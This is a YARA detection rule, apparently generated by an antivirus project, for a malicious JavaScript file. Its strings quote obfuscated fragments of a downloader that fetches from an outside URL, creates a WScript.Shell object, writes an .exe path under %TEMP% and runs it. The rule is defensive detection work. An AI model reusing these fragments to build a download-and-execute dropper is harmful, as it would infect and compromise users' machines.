rule sig_20160330_18c003f7a63fe6b393398a165f3bf14a {
  meta:
    description = "datamaliciousorder - file 20160330_18c003f7a63fe6b393398a165f3bf14a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "682a0ba7083d593f513764dad095f33399a8d8e55f8d59503fbe5b37e53c19f9"

  strings:
    $s1  = "_CC[_Z](\"GET\", \"http://mylookalikedoll.com/n2iks\", false);" fullword ascii
    $s2  = "var _U0 = function _H() {return WScript[_WV](\"WScript\"+\".Shell\");}(), _B0 = 11;" fullword ascii
    $s3  = "function _E(_XF, _I0){_W = _W * 1; return _XF - _I0;};" fullword ascii
    $s4  = "if (_CC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _WQ(){return _E0 + \"\";};" fullword ascii
    $s6  = "function _V() {return _U0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ue24vUQf.ex\" + \"e\";};" fullword ascii
    $s7  = "function _N(_E1){_U0[\"Run\"](_E1, _W, _W);};" fullword ascii
    $s8  = "function _T() {return ((_W0 == true) && (_W0 == _KH)) ? 1 : _W;};" fullword ascii
    $s9  = "var _V1 = new this[\"Date\"]();" fullword ascii
    $s10 = "function _PN(){return _WV;};" fullword ascii
    $s11 = "function _JV()" fullword ascii
    $s12 = "return _E(_I, _OP);" fullword ascii
    $s13 = "function _V0(_NW) {var _T0 = (1, 2, 3, 4, 5, _NW); return _T0;};" fullword ascii
    $s14 = " while (_YN){" fullword ascii
    $s15 = "function _Y(){return 22;};" fullword ascii
    $s16 = "var _V2 = false;" fullword ascii
    $s17 = "_W0 = true; " fullword ascii
    $s18 = "var _W0 = false;" fullword ascii
    $s19 = "var _KH = false;" fullword ascii
    $s20 = "_KH = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}